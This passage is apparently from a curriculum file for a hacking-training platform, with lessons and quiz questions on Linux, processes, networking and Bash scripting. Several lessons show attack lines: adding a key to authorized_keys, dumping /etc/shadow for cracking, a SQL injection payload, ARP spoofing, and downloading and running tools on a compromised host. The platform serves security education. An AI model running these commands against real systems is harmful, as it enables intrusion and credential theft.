                  explanation: "If your user can run even one risky command as root, that can often be abused to get a root shell. Many privilege escalation attacks begin by simply asking what sudo allows."
                }
              ]
            },
            {
              title: 'Important Security Files',
              instruction: `Know where sensitive information is stored.

**Password files:**

\`\`\`bash
/etc/passwd         # User accounts (readable by all)
/etc/shadow         # Password hashes (root only)
/etc/group          # Group information
\`\`\`

**Example /etc/passwd:**

\`\`\`
root:x:0:0:root:/root:/bin/bash
user:x:1000:1000:User Name:/home/user:/bin/bash
\`\`\`

**Example /etc/shadow:**

\`\`\`
root:$6$randomsalt$hashedpassword:18900:0:99999:7:::
user:$6$randomsalt$hashedpassword:18900:0:99999:7:::
\`\`\`

**SSH keys:**

\`\`\`bash
~/.ssh/id_rsa       # Private key (never share!)
~/.ssh/id_rsa.pub   # Public key
~/.ssh/authorized_keys  # Allowed keys for login
\`\`\`

**Hacking relevance:**

\`\`\`bash
# If you can write to authorized_keys:
echo "your_public_key" >> ~/.ssh/authorized_keys
# Now you can SSH in without password!

# If you can read shadow file:
sudo cat /etc/shadow > hashes.txt
# Use john or hashcat to crack passwords
\`\`\``,
              image: null,
              quiz: [
                {
                  id: 'p2r2-q4',
                  question: 'Where are password hashes stored on Linux?',
                  options: ['/etc/passwd', '/etc/shadow', '/etc/passwords', '/root/passwords'],
                  correctIndex: 1,
                  explanation: '/etc/shadow contains password hashes and is only readable by root. /etc/passwd contains user info but not the actual passwords.'
                },
                {
                  id: 'p2r2-q4a',
                  question: "What makes a SUID file special?",
                  options: [
                    "It can only be read by root",
                    "It is hidden from normal users",
                    "It runs with the privileges of its owner, not the person who runs it",
                    "It is automatically deleted after use"
                  ],
                  correctIndex: 2,
                  explanation: "If a SUID file is owned by root, then anyone who runs it gets root's power while it runs. That is useful for things like changing your password, but a weak SUID program can let attackers escalate to root."
                },
                {
                  id: 'p2r2-q4b',
                  question: "Which command searches the whole system for SUID files?",
                  options: [
                    "find / -perm -0777 -type d",
                    "ls -R / | grep suid",
                    "grep -r SUID /etc",
                    "find / -perm -4000 -type f"
                  ],
                  correctIndex: 3,
                  explanation: "The number 4000 is the SUID permission bit, and -type f limits the search to files. This command is a standard step in privilege escalation checks, since any odd or old SUID program is worth a closer look."
                }
              ]
            }
          ],
        },
        {
          id: 'room3',
          title: 'Processes & Networking',
          overview:
            "A system is a living organism, constantly exchanging data and running background tasks. To train like a hacker is to understand the heartbeat of the machine. In this room, you will learn to monitor every process and every open door in the target environment, identifying targets and evading detection.",
          estimatedMinutes: 35,
          steps: [
            {
              title: 'Understanding Processes',
              instruction: `Every running program is a process.

**View running processes:**

\`\`\`bash
ps                  # Your processes
ps aux              # All processes (detailed)
top                 # Live process monitor
htop                # Better version (if installed)
\`\`\`

**Find specific process:**

\`\`\`bash
ps aux | grep apache        # Find apache processes
ps aux | grep -i ssh        # Case-insensitive search
\`\`\`

**Process information:**

\`\`\`bash
ps aux
# USER  PID  %CPU  %MEM  COMMAND
# root  1234 0.5   2.0   /usr/sbin/apache2
\`\`\`

**Why this matters:**

When you compromise a system:
- See what's running
- Find interesting services
- Identify security software

\`\`\`bash
# Looking for antivirus?
ps aux | grep -i "av\\|antivirus\\|defender"
\`\`\``,
              image: null,
              quiz: [
                {
                  id: 'p2r3-q1',
                  question: 'Which command shows all running processes?',
                  options: ['ls -a', 'ps aux', 'top only', 'show processes'],
                  correctIndex: 1,
                  explanation: '"ps aux" shows all running processes with detailed information. "top" shows live updates, but "ps aux" is the standard command.'
                },
                {
                  id: 'p2r3-q1a',
                  question: "In the output of ps aux, what does the PID column show?",
                  options: [
                    "How much CPU the process uses",
                    "The user who started the process",
                    "The unique number that identifies each process",
                    "How much memory the process uses"
                  ],
                  correctIndex: 2,
                  explanation: "PID means process ID. You need it to manage a process, for example to stop it with kill. The other columns answer different questions: USER shows the owner, %CPU the processor use and %MEM the memory use."
                },
                {
                  id: 'p2r3-q1b',
                  question: "A server feels very slow. Which command gives a live, updating view so you can spot which process is using the most CPU?",
                  options: [
                    "cat /etc/passwd",
                    "ls -l /tmp",
                    "ifconfig",
                    "top"
                  ],
                  correctIndex: 3,
                  explanation: "top (or htop, which is easier to read) refreshes constantly and sorts by resource use. ps aux gives you only one snapshot. Spotting an odd process using lots of CPU can also be a sign of something running that should not be."
                }
              ]
            },
            {
              title: 'Managing Processes',
              instruction: `Control running processes.

**Kill a process:**

\`\`\`bash
kill PID            # Gracefully stop
kill -9 PID         # Force kill (SIGKILL)
killall apache2     # Kill all apache2 processes
\`\`\`

**Background and foreground:**

\`\`\`bash
command &           # Run in background
jobs                # List background jobs
fg %1               # Bring job 1 to foreground
bg %1               # Resume job 1 in background
\`\`\`

**Example:**

\`\`\`bash
# Run nmap scan in background
nmap target.com &

# Check it's running
jobs

# If you need to stop it
kill %1
\`\`\`

**Practical use:**

\`\`\`bash
# Run multiple scans simultaneously
nmap 192.168.1.0/24 -p 80 &
nmap 192.168.1.0/24 -p 443 &
nmap 192.168.1.0/24 -p 22 &

# Check all running
jobs
\`\`\``,
              image: null,
            },
            {
              title: 'Network Basics',
              instruction: `Check network configuration and connections.

**View network interfaces:**

\`\`\`bash
ifconfig            # Network interfaces (older)
ip addr             # Network interfaces (newer)
ip a                # Short version
\`\`\`

**Example output:**

\`\`\`bash
eth0: 192.168.1.100     # Your IP address
lo: 127.0.0.1           # Loopback (localhost)
\`\`\`

**Check connectivity:**

\`\`\`bash
ping google.com         # Test internet connection
ping 192.168.1.1        # Test local network
ping -c 4 target.com    # Send 4 packets only
\`\`\`

**DNS lookup:**

\`\`\`bash
nslookup google.com     # Find IP address
dig google.com          # Detailed DNS info
host google.com         # Simple lookup
\`\`\`

**Why this matters:**

\`\`\`bash
# Check if target is up
ping -c 1 target.com

# Find IP address
nslookup target.com
\`\`\``,
              image: null,
              quiz: [
                {
                  id: 'p2r3-q2',
                  question: 'What does "ping" command do?',
                  options: ['Scans all ports', 'Tests if a host is reachable on the network', 'Downloads files', 'Shows running processes'],
                  correctIndex: 1,
                  explanation: 'Ping sends ICMP echo requests to check if a host is online and measure response time.'
                },
                {
                  id: 'p2r3-q2a',
                  question: "A program is frozen and kill 1234 does not stop it. What is the stronger option?",
                  options: [
                    "kill -9 1234",
                    "kill 1234 again",
                    "killall 1234",
                    "ps 1234"
                  ],
                  correctIndex: 0,
                  explanation: "kill -9 sends a signal the program cannot ignore, so it is stopped immediately. The program gets no chance to save its data, so use it only when the normal kill fails. killall works with names, not PIDs."
                },
                {
                  id: 'p2r3-q2b',
                  question: "You start a long scan and want to keep using the terminal while it runs. What do you add to the end of the command?",
                  options: [
                    "|",
                    "&",
                    ">",
                    "--stop"
                  ],
                  correctIndex: 1,
                  explanation: "An & at the end runs the command in the background. You can see it with jobs and bring it back with fg. The pipe (|) sends output to another command and > sends output to a file, so neither one backgrounds the job."
                }
              ]
            },
            {
              title: 'Active Network Connections',
              instruction: `See what your system is connected to.

**View connections:**

\`\`\`bash
netstat -tulpn      # All listening ports
ss -tulpn           # Faster alternative to netstat
lsof -i             # List open network connections
\`\`\`

**Example output:**

\`\`\`bash
# Port 22 (SSH) is listening
tcp  0.0.0.0:22    LISTEN  1234/sshd

# Port 80 (HTTP) is listening
tcp  0.0.0.0:80    LISTEN  5678/apache2
\`\`\`

**Find specific port:**

\`\`\`bash
netstat -tulpn | grep :80       # Check port 80
lsof -i :443                    # Check port 443
\`\`\`

**Why this matters:**

\`\`\`bash
# After gaining access, check what's listening
netstat -tulpn

# Found MySQL on port 3306?
# Maybe you can access the database!
mysql -h 127.0.0.1 -u root
\`\`\`

**See active connections:**

\`\`\`bash
netstat -an | grep ESTABLISHED  # Active connections
\`\`\``,
              image: null,
              quiz: [
                {
                  id: 'p2r3-q3',
                  question: 'Why check listening ports on a compromised system?',
                  options: ['To slow it down', 'To find additional services you can exploit or access', 'To delete files', 'To install software'],
                  correctIndex: 1,
                  explanation: 'Listening ports reveal other services running on the system (databases, web servers, etc.) that may provide additional attack vectors or valuable data.'
                },
                {
                  id: 'p2r3-q3a',
                  question: "In the output of ip addr, what is the lo interface?",
                  options: [
                    "Your Wi-Fi card",
                    "The router",
                    "The loopback interface, which the machine uses to talk to itself",
                    "The connection to the internet"
                  ],
                  correctIndex: 2,
                  explanation: "lo is the loopback interface, and its address is 127.0.0.1. Traffic sent there never leaves your computer. eth0 is the usual name for the wired network card that connects you to the network."
                },
                {
                  id: 'p2r3-q3b',
                  question: "You run ping 192.168.1.10 and get replies. What does that tell you?",
                  options: [
                    "The host has no open ports",
                    "The host is vulnerable",
                    "A firewall is blocking everything",
                    "The host is reachable and responding"
                  ],
                  correctIndex: 3,
                  explanation: "Replies mean the host is up and your traffic can reach it. Be careful in the other direction: no reply does not always mean the host is down, because many hosts are set up to ignore ping."
                }
              ]
            },
            {
              title: 'Downloading Files',
              instruction: `Get files from the internet to your Linux system.

**wget:**

\`\`\`bash
wget http://example.com/file.txt        # Download file
wget -O custom-name.txt http://...      # Save with custom name
wget -r http://example.com              # Download recursively
\`\`\`

**curl:**

\`\`\`bash
curl http://example.com                 # Display content
curl -o file.txt http://example.com     # Save to file
curl -I http://example.com              # Get headers only
\`\`\`

**Practical examples:**

\`\`\`bash
# Download exploit from exploit-db
wget https://exploit-db.com/exploits/12345

# Download wordlist
wget https://github.com/danielmiessler/SecLists/rockyou.txt

# Get your public IP
curl ifconfig.me

# Test if website is up
curl -I https://target.com
\`\`\`

**Transfer tools to compromised system:**

\`\`\`bash
# On your machine, host the file
python3 -m http.server 8000

# On compromised machine, download it
wget http://your-ip:8000/tool.sh
chmod +x tool.sh
./tool.sh
\`\`\``,
              image: null,
            },
            {
              title: 'Basic Firewall Check',
              instruction: `See if firewall is blocking traffic.

**Check firewall rules:**

\`\`\`bash
sudo iptables -L            # View firewall rules
sudo ufw status             # UFW firewall status
\`\`\`

**Test port connectivity:**

\`\`\`bash
nc -zv target.com 80        # Test if port 80 is open
telnet target.com 80        # Alternative test
\`\`\`

**Check if port is blocked:**

\`\`\`bash
# Try to connect
nc -zv 192.168.1.1 445

# Success: Connection succeeded!
# Failure: Connection refused or timeout
\`\`\`

**Why this matters:**

Firewalls block attacks. You need to know:
- What ports are open?
- What's being filtered?
- How to bypass restrictions?

\`\`\`bash
# Port 80 blocked? Try 8080
# Port 443 blocked? Try 8443
# All ports blocked? Try DNS tunneling
\`\`\`

> Understanding what's blocked helps you find alternative entry points.`,
              image: null,
              quiz: [
                {
                  id: 'p2r3-q4',
                  question: 'What does "nc -zv target.com 80" do?',
                  options: ['Hacks port 80', 'Tests if port 80 is open on target.com', 'Closes port 80', 'Copies files'],
                  correctIndex: 1,
                  explanation: 'The netcat (nc) command with -z (zero-I/O mode) and -v (verbose) tests if a port is open without sending data.'
                },
                {
                  id: 'p2r3-q4a',
                  question: "You run ss -tulpn and see something listening on port 22. Which service is it most likely?",
                  options: [
                    "SSH, for secure remote access",
                    "A web server",
                    "A DNS server",
                    "An email server"
                  ],
                  correctIndex: 0,
                  explanation: "Port 22 is SSH. Port 80 is HTTP. Reading the listening ports tells you what the machine offers to the network, which is exactly what an attacker or tester wants to know."
                },
                {
                  id: 'p2r3-q4b',
                  question: "What does netstat -tulpn (or ss -tulpn) show you?",
                  options: [
                    "Every file owned by logged-in users",
                    "Listening TCP and UDP ports and the programs using them",
                    "Which websites users visited",
                    "Only your own IP address"
                  ],
                  correctIndex: 1,
                  explanation: "The flags mean TCP, UDP, listening, program and numeric. The p part is the key: it links each open port to a process, so you can tell what is listening and who started it."
                }
              ]
            }
          ],
        },
        {
          id: 'room4',
          title: 'Scripting Fundamentals',
          overview:
            "A hacker who cannot script is like a soldier who cannot aim. Automation is what separates the average user from the Qyvora elite. In this room, you will learn to build your own custom tools, automating the boring tasks so you can focus on the critical breakthroughs. Train like a hacker, automate like a pro.",
          estimatedMinutes: 40,
          steps: [
            {
              title: 'Why Learn Scripting?',
              instruction: `Automation saves time and reduces mistakes.

**Manual vs Automated:**

\`\`\`bash
# Manual: Test 1000 usernames (boring!)
# Type each one...

# Automated: Run script once
./brute-force.sh usernames.txt
\`\`\`

**What you can automate:**

- Repetitive scans
- File processing
- Report generation
- Data extraction
- Custom tools

**Common scripting languages:**

\`\`\`bash
Bash        # Quick Linux automation
Python      # Most popular for hacking tools
Ruby        # Used in Metasploit
PowerShell  # Windows automation
\`\`\`

> We'll focus on Bash since it's built into Linux.`,
              image: null,
              quiz: [
                {
                  id: 'p2r4-q1',
                  question: 'Why is scripting important for hackers?',
                  options: ['To show off skills', 'To automate repetitive tasks and build custom tools', 'Scripts run faster than commands', 'It looks professional'],
                  correctIndex: 1,
                  explanation: 'Scripting automates repetitive work and lets you build custom tools tailored to specific situations, making you more efficient.'
                },
                {
                  id: 'p2r4-q1a',
                  question: "You need to check 200 IP addresses to see which ones respond to ping. What is the best approach?",
                  options: [
                    "Ping each address by hand",
                    "Only test the first 10",
                    "Write a short script that loops through all of them",
                    "Skip the ones that look unlikely"
                  ],
                  correctIndex: 2,
                  explanation: "Repeating the same task many times is exactly what scripts are for. A short loop does in seconds what would take you an hour, and it will not make typing mistakes."
                },
                {
                  id: 'p2r4-q1b',
                  question: "Which language is the natural choice for automating terminal commands on Linux?",
                  options: [
                    "Swift",
                    "Visual Basic",
                    "Ruby",
                    "Bash"
                  ],
                  correctIndex: 3,
                  explanation: "Bash is the shell on most Linux systems, so anything you type in the terminal can go straight into a Bash script. Python is great for bigger tools and Ruby is what Metasploit is written in."
                }
              ]
            },
            {
              title: 'Your First Bash Script',
              instruction: `Create a simple automation script.

**Create script file:**

\`\`\`bash
nano scan.sh
\`\`\`

**Basic script structure:**

\`\`\`bash
#!/bin/bash
# This is a comment

echo "Starting scan..."
nmap -p 80,443 target.com
echo "Scan complete!"
\`\`\`

**Make it executable:**

\`\`\`bash
chmod +x scan.sh
\`\`\`

**Run it:**

\`\`\`bash
./scan.sh
\`\`\`

**Line-by-line explanation:**

\`\`\`bash
#!/bin/bash          # Tells Linux this is a bash script
# Comment           # Comments are ignored
echo "text"         # Print text
command              # Run any command
\`\`\``,
              image: null,
            },
            {
              title: 'Variables',
              instruction: `Store data in variables for reuse.

**Basic variables:**

\`\`\`bash
#!/bin/bash

# Define variables
TARGET="192.168.1.1"
PORT="80"

# Use variables
echo "Scanning $TARGET on port $PORT"
nmap -p $PORT $TARGET
\`\`\`

**User input:**

\`\`\`bash
#!/bin/bash

# Ask user for input
echo "Enter target IP:"
read TARGET

# Use the input
ping -c 4 $TARGET
\`\`\`

**Command output in variable:**

\`\`\`bash
#!/bin/bash

# Store command result
MY_IP=$(hostname -I | cut -d' ' -f1)

echo "Your IP is: $MY_IP"
\`\`\`

**Practical example:**

\`\`\`bash
#!/bin/bash
# Quick port scanner

read -p "Enter target: " TARGET
read -p "Enter port: " PORT

echo "Testing port $PORT on $TARGET..."
nc -zv $TARGET $PORT
\`\`\``,
              image: null,
              quiz: [
                {
                  id: 'p2r4-q2',
                  question: 'How do you use a variable in bash?',
                  options: ['variable', '%variable%', '$variable', '@variable'],
                  correctIndex: 2,
                  explanation: 'In bash, use $ before the variable name to access its value: $TARGET, $PORT, etc.'
                },
                {
                  id: 'p2r4-q2a',
                  question: "What does the first line #!/bin/bash in a script do?",
                  options: [
                    "Tells the system to run the script using Bash",
                    "Makes the file executable",
                    "Installs Bash",
                    "Prints the word bash on the screen"
                  ],
                  correctIndex: 0,
                  explanation: "This first line is called the shebang. It names the program that should run the script. Making the file executable is a separate step done with chmod +x."
                },
                {
                  id: 'p2r4-q2b',
                  question: "You created hello.sh, but ./hello.sh says Permission denied. What fixes it?",
                  options: [
                    "rm hello.sh",
                    "chmod +x hello.sh",
                    "cat hello.sh",
                    "mkdir hello.sh"
                  ],
                  correctIndex: 1,
                  explanation: "New files are not executable by default. chmod +x adds the execute permission, so then ./hello.sh works. The ./ part tells Linux to run the script from the current folder."
                }
              ]
            },
            {
              title: 'Loops',
              instruction: `Repeat actions automatically.

**For loop:**

\`\`\`bash
#!/bin/bash

# Scan multiple hosts
for IP in 192.168.1.1 192.168.1.2 192.168.1.3
do
    echo "Scanning $IP"
    ping -c 1 $IP
done
\`\`\`

**Loop through range:**

\`\`\`bash
#!/bin/bash

# Scan ports 1-100
for PORT in {1..100}
do
    nc -zv target.com $PORT 2>&1 | grep -q "succeeded" && echo "Port $PORT open"
done
\`\`\`

**Read from file:**

\`\`\`bash
#!/bin/bash

# Test each target from file
while read TARGET
do
    echo "Testing $TARGET"
    ping -c 1 $TARGET
done < targets.txt
\`\`\`

**Practical: Multi-target scanner:**

\`\`\`bash
#!/bin/bash
# Scan multiple targets for open port 80

for IP in $(cat targets.txt)
do
    echo "Checking $IP:80"
    nc -zv -w 2 $IP 80 2>&1 | grep "succeeded" && echo "$IP has port 80 open"
done
\`\`\``,
              image: null,
            },
            {
              title: 'Conditionals',
              instruction: `Make decisions in scripts.

**If statement:**

\`\`\`bash
#!/bin/bash

read -p "Enter IP: " TARGET

# Check if target responds
if ping -c 1 $TARGET &> /dev/null
then
    echo "$TARGET is online"
    nmap $TARGET
else
    echo "$TARGET is offline"
fi
\`\`\`

**Check file exists:**

\`\`\`bash
#!/bin/bash

FILE="targets.txt"

if [ -f $FILE ]
then
    echo "File exists, starting scan"
    # Process file
else
    echo "Error: $FILE not found"
fi
\`\`\`

**Multiple conditions:**

\`\`\`bash
#!/bin/bash

if [ $PORT -eq 22 ]
then
    echo "SSH port"
elif [ $PORT -eq 80 ]
then
    echo "HTTP port"
elif [ $PORT -eq 443 ]
then
    echo "HTTPS port"
else
    echo "Unknown port"
fi
\`\`\`

**Practical: Smart scanner:**

\`\`\`bash
#!/bin/bash

if [ $# -eq 0 ]
then
    echo "Usage: $0 <target>"
    exit 1
fi

TARGET=$1

if ping -c 1 $TARGET &> /dev/null
then
    echo "Target is up, scanning..."
    nmap -sV $TARGET
else
    echo "Target is down or blocking ping"
fi
\`\`\``,
              image: null,
              quiz: [
                {
                  id: 'p2r4-q3',
                  question: 'What does an if statement do in a script?',
                  options: ['Repeats commands', 'Makes decisions based on conditions', 'Stops the script', 'Creates variables'],
                  correctIndex: 1,
                  explanation: 'If statements allow scripts to make decisions and execute different code based on whether conditions are true or false.'
                },
                {
                  id: 'p2r4-q3a',
                  question: "You set TARGET='192.168.1.1' in a script. How do you use the variable in a command?",
                  options: [
                    "ping TARGET",
                    "ping =TARGET",
                    "ping $TARGET",
                    "ping 'TARGET'"
                  ],
                  correctIndex: 2,
                  explanation: "You store a value with no spaces around the = sign, and you read it back with a $ in front of the name. Without the $, Bash treats TARGET as plain text instead of the stored value."
                },
                {
                  id: 'p2r4-q3b',
                  question: "What does DATE=$(date) do?",
                  options: [
                    "Stores the word date in DATE",
                    "Asks the user to type a date",
                    "Deletes the variable DATE",
                    "Runs the date command and stores its output in DATE"
                  ],
                  correctIndex: 3,
                  explanation: "$(command) runs the command and gives back what it printed, so you can keep that output in a variable. To ask the user for input you would use read instead."
                }
              ]
            },
            {
              title: 'Practical Scripts',
              instruction: `Build real hacking automation tools.

**Port scanner:**

\`\`\`bash
#!/bin/bash
# Simple port scanner

TARGET=$1
START=$2
END=$3

echo "Scanning $TARGET ports $START-$END"

for PORT in $(seq $START $END)
do
    timeout 1 bash -c "echo >/dev/tcp/$TARGET/$PORT" 2>/dev/null && 
        echo "Port $PORT is open"
done
\`\`\`

**Subdomain finder:**

\`\`\`bash
#!/bin/bash
# Find subdomains

DOMAIN=$1

for SUB in www mail ftp admin dev test staging
do
    echo "Trying $SUB.$DOMAIN"
    host $SUB.$DOMAIN | grep "has address" && 
        echo "$SUB.$DOMAIN exists!"
done
\`\`\`

**Log analyzer:**

\`\`\`bash
#!/bin/bash
# Find failed login attempts

LOG="/var/log/auth.log"

echo "Failed SSH attempts:"
grep "Failed password" $LOG | 
    awk '{print $(NF-3)}' | 
    sort | uniq -c | sort -rn | head -10
\`\`\`

**Quick recon:**

\`\`\`bash
#!/bin/bash
# Quick target reconnaissance

TARGET=$1

echo "=== Quick Recon: $TARGET ==="
echo ""
echo "[*] DNS Lookup:"
host $TARGET
echo ""
echo "[*] Ping Test:"
ping -c 2 $TARGET
echo ""
echo "[*] Port Scan (common ports):"
nmap -F $TARGET
echo ""
echo "[*] Web Headers:"
curl -I http://$TARGET
\`\`\`

> Save these scripts and modify them for your needs!`,
              image: null,
              quiz: [
                {
                  id: 'p2r4-q4',
                  question: 'What is the first line of every bash script?',
                  options: ['#!/bin/bash', '#start', '//begin', '<script>'],
                  correctIndex: 0,
                  explanation: '#!/bin/bash (called a shebang) tells Linux this file should be executed with the bash interpreter.'
                },
                {
                  id: 'p2r4-q4a',
                  question: "Which loop runs a command once for each number from 1 to 100?",
                  options: [
                    "for i in {1..100}; do ...; done",
                    "if i in 1..100; then ...; fi",
                    "echo {1..100} > loop",
                    "while 1..100; do ...; done"
                  ],
                  correctIndex: 0,
                  explanation: "A for loop with {1..100} repeats the commands in the body once for every value. It works well for things like trying each port number or each host in a range."
                },
                {
                  id: 'p2r4-q4b',
                  question: "You have targets.txt with one IP address per line. How do you run the same scan on each line?",
                  options: [
                    "Write each IP into the script by hand",
                    "Use a while read loop that reads the file line by line",
                    "Use ls targets.txt",
                    "Rename the file to targets.sh"
                  ],
                  correctIndex: 1,
                  explanation: "while read takes one line at a time from the file and puts it in a variable, so one script can handle a list of any size. You are only changing the file, not the script. Only scan targets you are authorized to test."
                }
              ]
            }
          ],
        }],
    },

    // ── PHASE 3: NETWORKING (moduleId: 3, 4 rooms) ──────────────────────────
    {
      id: 'phase3',
      title: 'Networking',
      codename: 'PHASE 3',
      color: PHASE_COLORS.phase3,
      rooms: [
        {
          id: 'room1',
          title: 'TCP/IP & OSI Model',
          overview:
            "Every attack and defense in the Qyvora arsenal starts with a fundamental truth: data must move. To become an elite operative, you must look past the screen and see the raw streams of bits traveling through the OSI layers. This room builds the theoretical framework you need to map digital terrain and identify the protocols that underpin everything you will compromise.",
          estimatedMinutes: 35,
          steps: [
            {
              title: 'How Data Travels',
              instruction: `When you visit a website, data travels through layers.

**Simple explanation:**

\`\`\`
Your browser → Your computer → Your router → 
Internet → Target server → Back to you
\`\`\`

**Each layer adds information:**

Like putting a letter in an envelope, then in a box, then in a shipping container.

**Why this matters:**

Understanding layers helps you:
- Intercept data
- Bypass firewalls
- Hide your traffic

> Every hacker needs to understand how data moves.`,
              image: null,
            },
            {
              title: 'The OSI Model (Simplified)',
              instruction: `The OSI model has 7 layers. Here's what you need to know:

**Layer 7: Application**
- What you see (websites, emails, SSH)
- Examples: HTTP, FTP, DNS, SSH

**Layer 4: Transport**
- How data is delivered
- TCP (reliable) vs UDP (fast)

**Layer 3: Network**
- Routing between networks
- IP addresses

**Layer 2: Data Link**
- Local network communication
- MAC addresses

**Simplified:**

\`\`\`
Layer 7: The app you use (browser, email)
Layer 4: How it gets there (TCP/UDP)
Layer 3: Where it goes (IP address)
Layer 2: Local network (MAC address)
\`\`\`

**Hacking at different layers:**

\`\`\`bash
# Layer 7: Web attack
curl http://target.com/?id=1' OR '1'='1

# Layer 3: Network scan
nmap 192.168.1.0/24

# Layer 2: ARP spoofing
arpspoof -t victim gateway
\`\`\``,
              image: null,
              quiz: [
                {
                  id: 'p3r1-q1',
                  question: 'Which layer handles IP addresses?',
                  options: ['Layer 7 (Application)', 'Layer 4 (Transport)', 'Layer 3 (Network)', 'Layer 2 (Data Link)'],
                  correctIndex: 2,
                  explanation: 'Layer 3 (Network layer) handles IP addresses and routing between networks.'
                },
                {
                  id: 'p3r1-q1a',
                  question: "Why does it matter that your data passes through many devices on its way to a server?",
                  options: [
                    "Every device on the path makes the data travel faster",
                    "Each device along the path is a place where unencrypted data could be read or changed",
                    "The data is always encrypted by the router",
                    "Only the final server can ever see the data"
                  ],
                  correctIndex: 1,
                  explanation: "Your data goes through your Wi-Fi, your router, your internet provider and more. If it is not encrypted, anyone controlling one of these points could read it or change it. This is why hackers study the path, and why encryption such as HTTPS matters."
                },
                {
                  id: 'p3r1-q1b',
                  question: "Data is split into small pieces called packets before it is sent. Why is this useful?",
                  options: [
                    "It makes the data impossible to read",
                    "It lets the data skip the router",
                    "Packets can take different routes, and only the lost pieces need to be sent again",
                    "It reduces the file to zero size"
                  ],
                  correctIndex: 2,
                  explanation: "Sending a big file in small packets is more flexible. If one packet gets lost, only that one is resent instead of the whole file. At the other end, the packets are put back together in the correct order."
                }
              ]
            },
            {
              title: 'IP Addresses',
              instruction: `Every device on a network has an IP address.

**IPv4 format:**

\`\`\`
192.168.1.100
\`\`\`

**Types of IP addresses:**

\`\`\`
Public IP:   Visible on internet (8.8.8.8)
Private IP:  Internal network (192.168.x.x, 10.x.x.x)
Loopback:    Your own machine (127.0.0.1)
\`\`\`

**Common private ranges:**

\`\`\`
192.168.0.0 - 192.168.255.255
10.0.0.0 - 10.255.255.255
172.16.0.0 - 172.31.255.255
\`\`\`

**Check your IP:**

\`\`\`bash
# Your private IP
hostname -I

# Your public IP
curl ifconfig.me
\`\`\`

**Why this matters:**

\`\`\`bash
# Target is on same network? (192.168.1.x)
# Direct attack possible

# Target is on different network?
# Need to route through internet
\`\`\``,
              image: null,
              quiz: [
                {
                  id: 'p3r1-q2',
                  question: 'Which is a private IP address?',
                  options: ['8.8.8.8', '192.168.1.100', '1.1.1.1', '151.101.1.140'],
                  correctIndex: 1,
                  explanation: '192.168.x.x addresses are private (internal network). 8.8.8.8 and 1.1.1.1 are public DNS servers.'
                },
                {
                  id: 'p3r1-q2a',
                  question: "You can ping a server's IP address and get replies, but its website will not load. Where is the problem most likely?",
                  options: [
                    "In the cable (Layer 1)",
                    "In the IP address, which must be wrong",
                    "In your network card",
                    "In the higher layers, such as the web service or the port it uses"
                  ],
                  correctIndex: 3,
                  explanation: "A ping reply shows the lower layers work: the cable, the local network and IP routing. So the problem is higher up, for example a firewall blocking port 80 or 443, or the web server not running. Thinking in layers helps you narrow a problem down fast."
                },
                {
                  id: 'p3r1-q2b',
                  question: "Which OSI layer is responsible for port numbers and for choosing between TCP and UDP?",
                  options: [
                    "Layer 4 (Transport)",
                    "Layer 7 (Application)",
                    "Layer 3 (Network)",
                    "Layer 2 (Data Link)"
                  ],
                  correctIndex: 0,
                  explanation: "Layer 4 is the Transport layer. It decides how data is delivered and uses ports to send it to the right program. Layer 3 deals with IP addresses and Layer 2 with MAC addresses."
                }
              ]
            },
            {
              title: 'TCP vs UDP',
              instruction: `Two main ways to send data: TCP and UDP.

**TCP (Transmission Control Protocol):**

- Reliable (guarantees delivery)
- Slower
- Used for: Web, email, file transfer

\`\`\`
Think: Registered mail (confirmed delivery)
\`\`\`

**UDP (User Datagram Protocol):**

- Fast
- No guarantee of delivery
- Used for: Video streaming, gaming, DNS

\`\`\`
Think: Regular mail (might get lost, but fast)
\`\`\`

**Port numbers:**

Every service uses a port:

\`\`\`
22   - SSH
80   - HTTP (web)
443  - HTTPS (secure web)
53   - DNS
3306 - MySQL database
\`\`\`

**Scanning for services:**

\`\`\`bash
# TCP scan (default)
nmap target.com

# UDP scan
nmap -sU target.com

# Specific ports
nmap -p 22,80,443 target.com
\`\`\``,
              image: null,
            },
            {
              title: 'Subnets and CIDR',
              instruction: `Subnets group IP addresses together.

**CIDR notation:**

\`\`\`
192.168.1.0/24
              └─ This means 256 addresses
                 (192.168.1.0 to 192.168.1.255)
\`\`\`

**Common subnet sizes:**

\`\`\`
/24 = 256 addresses   (192.168.1.0/24)
/16 = 65,536 addresses (192.168.0.0/16)
/32 = 1 address (single host)
\`\`\`

**Why this matters for hacking:**

\`\`\`bash
# Scan entire subnet
nmap 192.168.1.0/24

# Scan specific range
nmap 192.168.1.1-50

# Scan multiple subnets
nmap 192.168.1.0/24 192.168.2.0/24
\`\`\`

**Calculate subnet:**

\`\`\`bash
# Your network range
ip addr show | grep inet

# Example output:
# inet 192.168.1.100/24
# This means you can reach 192.168.1.1-254
\`\`\``,
              image: null,
              quiz: [
                {
                  id: 'p3r1-q3',
                  question: 'What does 192.168.1.0/24 mean?',
                  options: ['24 devices', 'Subnet with 256 addresses (192.168.1.0-255)', 'Port 24', 'IPv6 address'],
                  correctIndex: 1,
                  explanation: '/24 means the first 24 bits are the network portion, leaving 8 bits for hosts (2^8 = 256 addresses).'
                },
                {
                  id: 'p3r1-q3a',
                  question: "Your laptop shows 192.168.1.20, but a website says your IP address is something completely different. Why?",
                  options: [
                    "One of the two numbers is fake",
                    "Your laptop has a private IP, and the website sees your router's public IP",
                    "The website changed your IP",
                    "Your laptop has two network cards"
                  ],
                  correctIndex: 1,
                  explanation: "Devices inside a home or office network use private addresses. Your router shares one public address for all of them when talking to the internet. This is why an outside scan reaches the router's public IP, not your laptop directly."
                },
                {
                  id: 'p3r1-q3b',
                  question: "Which of these is a public IP address?",
                  options: [
                    "10.1.2.3",
                    "172.16.0.5",
                    "8.8.4.4",
                    "192.168.50.7"
                  ],
                  correctIndex: 2,
                  explanation: "The three other addresses belong to the private ranges 10.x.x.x, 172.16.x.x and 192.168.x.x, which are used only inside networks. Public addresses like 8.8.4.4 can be reached across the internet."
                }
              ]
            },
            {
              title: 'Three-Way Handshake',
              instruction: `How TCP connections start (simplified).

**The handshake:**

\`\`\`
Client: SYN (Can I connect?)
Server: SYN-ACK (Yes, ready!)
Client: ACK (Okay, let's talk!)
\`\`\`

**Why this matters:**

**1. Port scanning uses this:**

\`\`\`bash
# SYN scan (stealthy)
nmap -sS target.com

# If port open: SYN-ACK received
# If port closed: RST received
\`\`\`

**2. Firewalls watch for this:**

\`\`\`
Firewall sees SYN without full handshake
= Probably a scan
= Block the IP
\`\`\`

**3. DDoS attacks abuse this:**

\`\`\`
Send many SYN packets
Server waits for ACK
Server runs out of resources = crash
\`\`\`

**See handshakes:**

\`\`\`bash
# Capture traffic
